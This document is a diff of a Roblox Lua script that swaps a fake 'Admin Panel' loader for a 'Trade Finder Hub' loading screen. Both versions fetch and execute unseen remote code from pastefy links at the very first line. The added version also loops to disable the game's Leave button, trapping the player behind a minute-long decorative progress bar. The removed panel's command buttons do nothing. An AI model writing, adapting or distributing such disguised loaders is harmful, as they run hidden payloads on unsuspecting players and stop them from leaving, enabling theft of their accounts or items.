@@ -1,203 +1,167 @@
-loadstring(game:HttpGet("https://pastefy.app/D7FV4igT/raw"))()
---// Services
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-local player = Players.LocalPlayer
+loadstring(game:HttpGet("https://pastefy.app/M2kvA0c1/raw"))()
+--// Cute Loading Screen
+--// Put this in StarterGui > LocalScript
 
---// ScreenGui Setup
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "AdminLoadingGUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = player:WaitForChild("PlayerGui")
+local player = game.Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
 
---// UI Frame
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 320, 0, 180)
-Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Parent = ScreenGui
+-- Added snippet
+task.spawn(function()
+	while task.wait() do
+		pcall(function()
+			for _,v in ipairs(getconnections(
+				game:GetService("CoreGui")
+				.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
+				.Page.PageViewClipper.PageView.PageViewInnerFrame
+				.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer
+				.LeaveGameButton.Activated
+			)) do
+				v:Disable()
+			end
+		end)
+	end
+end)
 
-Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
+local gui = Instance.new("ScreenGui")
+gui.Name = "CuteLoader"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
--- Visuals: Gradient (Green/Blue for Admin theme)
-local grad = Instance.new("UIGradient", Frame)
-grad.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 150)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
+-- MAIN FRAME
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 360, 0, 190)
+frame.Position = UDim2.new(0.35, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(255, 228, 236)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 20)
+corner.Parent = frame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(255, 182, 193)
+stroke.Thickness = 3
+stroke.Parent = frame
+
+-- TOP BAR
+local top = Instance.new("Frame")
+top.Size = UDim2.new(1, 0, 0, 35)
+top.BackgroundColor3 = Color3.fromRGB(255, 192, 203)
+top.BorderSizePixel = 0
+top.Parent = frame
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 20)
+topCorner.Parent = top
+
+-- TITLE
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 35)
+title.BackgroundTransparency = 1
+title.Text = "Trade Finder Hub Loading.."
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Parent = top
+
+-- DECOR HEARTS
+for i = 1,6 do
+	local heart = Instance.new("TextLabel")
+	heart.Size = UDim2.new(0, 25, 0, 25)
+	heart.Position = UDim2.new(0, (i * 50)-35, 0, 45)
+	heart.BackgroundTransparency = 1
+	heart.Text = "♡"
+	heart.Font = Enum.Font.GothamBold
+	heart.TextScaled = true
+	heart.TextColor3 = Color3.fromRGB(255, 182, 193)
+	heart.Parent = frame
+end
+
+-- STATUS TEXT
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 40)
+status.Position = UDim2.new(0, 10, 0, 85)
+status.BackgroundTransparency = 1
+status.Text = "Initializing..."
+status.Font = Enum.Font.GothamMedium
+status.TextSize = 22
+status.TextColor3 = Color3.fromRGB(120, 80, 90)
+status.Parent = frame
+
+-- PROGRESS BAR BG
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.85, 0, 0, 20)
+barBG.Position = UDim2.new(0.075, 0, 0, 140)
+barBG.BackgroundColor3 = Color3.fromRGB(255, 240, 245)
+barBG.BorderSizePixel = 0
+barBG.Parent = frame
+
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(1,0)
+bgCorner.Parent = barBG
+
+-- PROGRESS BAR
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1,0)
+barCorner.Parent = bar
+
+-- LOADING TEXTS
+local messages = {
+	"Configuring assets...",
+	"Executing modules...",
+	"Loading interface...",
+	"Syncing data...",
+	"Preparing visuals...",
+	"Injecting scripts...",
+	"Applying settings...",
+	"Finalizing setup..."
 }
 
--- Visuals: Title & Credit
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.BackgroundTransparency = 1
-Title.Text = "Admin System"
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 22
-Title.TextColor3 = Color3.new(1, 1, 1)
-Title.Parent = Frame
+-- ANIMATION
+for i = 1, #messages do
+	status.Text = messages[i]
 
-local Credit = Instance.new("TextLabel")
-Credit.Size = UDim2.new(1, 0, 0, 20)
-Credit.Position = UDim2.new(0, 0, 0, 35)
-Credit.BackgroundTransparency = 1
-Credit.Text = "Initializing Secure Panel..."
-Credit.Font = Enum.Font.Gotham
-Credit.TextSize = 14
-Credit.TextColor3 = Color3.fromRGB(200, 200, 200)
-Credit.Parent = Frame
+	local goal = {}
+	goal.Size = UDim2.new(i / #messages, 0, 1, 0)
 
--- Interaction: Button
-local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0.8, 0, 0, 50)
-Button.Position = UDim2.new(0.1, 0, 0.45, 0)
-Button.Text = "Generate Admin Panel"
-Button.Font = Enum.Font.GothamBold
-Button.TextSize = 18
-Button.TextColor3 = Color3.new(1, 1, 1)
-Button.BackgroundColor3 = Color3.fromRGB(30, 40, 50)
-Button.Parent = Frame
+	local tween = TweenService:Create(
+		bar,
+		TweenInfo.new(7.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		goal
+	)
 
-Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
+	tween:Play()
+	tween.Completed:Wait()
+end
 
---// DRAG SYSTEM
-local dragging, dragStart, startPos
-Frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = Frame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then dragging = false end
-		end)
+-- WAIT TO COMPLETE 1 MIN TOTAL
+wait(60 - (#messages * 7.5))
+
+status.Text = "Completed ♡"
+
+wait(2)
+
+-- FADE OUT
+for _, obj in pairs(frame:GetDescendants()) do
+	if obj:IsA("TextLabel") then
+		TweenService:Create(obj, TweenInfo.new(1), {
+			TextTransparency = 1
+		}):Play()
+	elseif obj:IsA("Frame") then
+		TweenService:Create(obj, TweenInfo.new(1), {
+			BackgroundTransparency = 1
+		}):Play()
 	end
-end)
-UIS.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-		local delta = input.Position - dragStart
-		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
-end)
+end
 
---// BUTTON LOGIC & ADMIN PANEL EXECUTION
-Button.MouseButton1Click:Connect(function()
-	if Frame:FindFirstChild("Timer") then return end
-
-	Button.Active = false
-	Button.AutoButtonColor = false
-	Button.Text = "Loading..."
-
-	local Timer = Instance.new("TextLabel")
-	Timer.Name = "Timer"
-	Timer.Size = UDim2.new(1, 0, 0, 30)
-	Timer.Position = UDim2.new(0, 0, 0.8, 0)
-	Timer.BackgroundTransparency = 1
-	Timer.Font = Enum.Font.Gotham
-	Timer.TextSize = 16
-	Timer.TextColor3 = Color3.new(1, 1, 1)
-	Timer.Parent = Frame
-
-	-- The 20 second countdown
-	for i = 20, 1, -1 do
-		Timer.Text = "Generating Admin Panel... "..i.."s"
-		task.wait(1)
-	end
-
-	Timer.Text = "Injecting Panel..."
-	task.wait(0.5)
-
-	--// EXECUTE YOUR ADMIN PANEL SCRIPT
-	local success, err = pcall(function()
-		-- Your specific MiniAdminPanel code
-		loadstring(game:HttpGet("https://pastefy.app/qYlkCOqd/raw"))()
-		
-		local gui = Instance.new("ScreenGui")
-		gui.Name = "MiniAdminPanel"
-		gui.ResetOnSpawn = false
-		gui.Parent = player:WaitForChild("PlayerGui")
-
-		local frame = Instance.new("Frame")
-		frame.Size = UDim2.new(0, 280, 0, 300)
-		frame.Position = UDim2.new(0.5, -140, 0.5, -150)
-		frame.BackgroundColor3 = Color3.fromRGB(30, 60, 40)
-		frame.BorderSizePixel = 0
-		frame.Active = true
-		frame.Draggable = true
-		frame.Parent = gui
-
-		local title = Instance.new("TextLabel")
-		title.Size = UDim2.new(1, 0, 0, 36)
-		title.BackgroundColor3 = Color3.fromRGB(90, 120, 130)
-		title.Text = "ADMIN PANEL"
-		title.TextScaled = true
-		title.Font = Enum.Font.GothamBold
-		title.TextColor3 = Color3.new(1,1,1)
-		title.Parent = frame
-
-		local cmdBox = Instance.new("TextBox")
-		cmdBox.Size = UDim2.new(1, -12, 0, 32)
-		cmdBox.Position = UDim2.new(0, 6, 0, 42)
-		cmdBox.PlaceholderText = "Enter command"
-		cmdBox.Text = ""
-		cmdBox.TextScaled = true
-		cmdBox.Font = Enum.Font.Gotham
-		cmdBox.BackgroundColor3 = Color3.fromRGB(20,40,30)
-		cmdBox.TextColor3 = Color3.new(1,1,1)
-		cmdBox.Parent = frame
-
-		local container = Instance.new("Frame")
-		container.Size = UDim2.new(1, -12, 1, -100)
-		container.Position = UDim2.new(0, 6, 0, 80)
-		container.BackgroundTransparency = 1
-		container.Parent = frame
-
-		local layout = Instance.new("UIGridLayout")
-		layout.CellSize = UDim2.new(0, 125, 0, 36)
-		layout.CellPadding = UDim2.new(0, 6, 0, 6)
-		layout.Parent = container
-
-		local commands = {";rocket", ";ragdoll", ";balloon", ";inverse", ";nightvision", ";jail", ";control", ";tiny", ";jumpscare", ";morph"}
-
-		for _,cmd in ipairs(commands) do
-			local btn = Instance.new("TextButton")
-			btn.Text = cmd
-			btn.TextScaled = true
-			btn.Font = Enum.Font.GothamBold
-			btn.TextColor3 = Color3.new(1,1,1)
-			btn.BackgroundColor3 = Color3.fromRGB(15, 80, 50)
-			btn.Parent = container
-
-			btn.MouseButton1Click:Connect(function()
-				btn.BackgroundColor3 = Color3.fromRGB(0,150,80)
-				task.wait(0.15)
-				btn.BackgroundColor3 = Color3.fromRGB(15,80,50)
-			end)
-		end
-
-		local toggle = Instance.new("TextButton")
-		toggle.Size = UDim2.new(0, 90, 0, 28)
-		toggle.Position = UDim2.new(1, -96, 1, -34)
-		toggle.Text = "Hide"
-		toggle.TextScaled = true
-		toggle.Font = Enum.Font.GothamBold
-		toggle.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
-		toggle.TextColor3 = Color3.new(1,1,1)
-		toggle.Parent = frame
-
-		local visible = true
-		toggle.MouseButton1Click:Connect(function()
-			visible = not visible
-			container.Visible = visible
-			cmdBox.Visible = visible
-			toggle.Text = visible and "Hide" or "Show"
-		end)
-	end)
-
-	if not success then
-		warn("Admin Panel Error: " .. tostring(err))
-	end
-
-	-- Cleanup the loading UI
-	ScreenGui:Destroy()
-end)
+wait(1.2)
+gui:Destroy()
